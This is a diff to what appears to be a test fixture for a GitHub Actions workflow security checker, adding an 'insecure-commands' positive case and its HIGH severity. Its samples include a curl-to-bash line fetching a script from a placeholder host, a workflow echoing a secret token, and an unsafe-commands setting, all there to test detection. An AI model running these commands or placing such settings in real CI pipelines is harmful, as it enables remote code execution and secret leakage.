@@ -55,6 +55,10 @@ CASOS_POSITIVOS: dict[str, str] = {
         "    uses: org/repo/.github/workflows/ci.yml@main\n    secrets: inherit\n"
     ),
     "secret-in-run": _steps('    steps:\n      - run: echo "token=${{ secrets.API_TOKEN }}"\n'),
+    "insecure-commands": _steps(
+        "    env:\n      ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'\n"
+        "    steps:\n      - run: echo oi\n"
+    ),
     "curl-pipe-shell": _steps("    steps:\n      - run: curl https://x.invalid/i.sh | bash\n"),
     "self-hosted-runner": (
         "on: push\npermissions: {}\njobs:\n  b:\n    runs-on: self-hosted\n"
@@ -108,6 +112,7 @@ SEVERIDADES: dict[str, Severity] = {
     "broad-permissions": Severity.HIGH,
     "secret-in-run": Severity.HIGH,
     "checkout-credentials-in-artifact": Severity.HIGH,
+    "insecure-commands": Severity.HIGH,
     "invalid-yaml": Severity.HIGH,
     "curl-pipe-shell": Severity.MEDIUM,
     "self-hosted-runner": Severity.MEDIUM,
